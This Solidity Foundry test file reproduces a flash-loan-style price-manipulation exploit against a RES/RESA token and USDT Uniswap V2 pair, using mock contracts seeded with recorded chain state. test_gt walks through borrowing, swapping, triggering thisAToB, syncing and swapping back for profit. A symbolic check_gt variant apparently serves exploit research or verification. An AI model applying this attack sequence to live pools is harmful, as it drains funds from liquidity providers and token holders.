// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./RESA.sol";
import "./RESB.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract RESTest is Test, BlockLoader {
    USDT usdt;
    RESA resA;
    RESB resB;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address resAAddr;
    address resBAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1665051347;
    uint112 reserve0pair = 260015849847947963440692;
    uint112 reserve1pair = 110613876127006;
    uint32 blockTimestampLastpair = 1665051026;
    uint256 kLastpair = 28764334780639874147119408317574911061;
    uint256 price0CumulativeLastpair = 11557766562542920381201746547367;
    uint256 price1CumulativeLastpair =
        107365230799754738692677721684334104442039344950074;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 260015849847947963440692;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtresA = 0;
    uint256 balanceOfusdtresB = 0;
    uint256 totalSupplyresA = 129995235857469934;
    uint256 balanceOfresApair = 110613876127006;
    uint256 balanceOfresAattacker = 0;
    uint256 balanceOfresAresA = 13784158870;
    uint256 balanceOfresAresB = 0;
    uint256 totalSupplyresB = 30000000000000000000000;
    uint256 balanceOfresBpair = 0;
    uint256 balanceOfresBattacker = 0;
    uint256 balanceOfresBresA = 30077093744322625693517;
    uint256 balanceOfresBresB = 0;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        resA = new RESA(totalSupplyresA);
        resAAddr = address(resA);
        resB = new RESB(totalSupplyresB);
        resBAddr = address(resB);
        pair = new UniswapV2Pair(
            address(usdt),
            address(resA),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        resA.transfer(address(resA), balanceOfresAresA);
        resB.transfer(address(resA), balanceOfresBresA);
        usdt.transfer(address(pair), balanceOfusdtpair);
        resA.transfer(address(pair), balanceOfresApair);
        resA.afterDeploy(address(pair), address(router), address(usdt));
        resA.transfer(address(resA), 1000000e8);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(usdt),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(usdt),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("Resa Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(resA),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(resA),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(resA),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("Resb Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(resB),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(resB),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(resB),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(pair),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(pair),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(attackContract),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(attackContract),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_owner_resA(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        resA.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_resA(uint256 amount) internal {
        resA.transfer(owner, amount);
    }

    function borrow_owner_resB(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        resB.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_resB(uint256 amount) internal {
        resB.transfer(owner, amount);
    }

    function swap_pair_usdt_resA(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(resA);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_resA_usdt(uint256 amount) internal {
        resA.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(resA);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function addliquidity_pair_resA() internal {
        resA.thisAToB();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_resA(1000000e8);
        printBalance("After step0 ");
        swap_pair_resA_usdt(resA.balanceOf(attacker));
        printBalance("After step1 ");
        addliquidity_pair_resA();
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_usdt_resA(90000e18);
        printBalance("After step4 ");
        payback_owner_resA((1000000e8 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_resA(amt0);
        swap_pair_resA_usdt(amt1);
        addliquidity_pair_resA();
        sync_pair();
        swap_pair_usdt_resA(amt2);
        payback_owner_resA(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
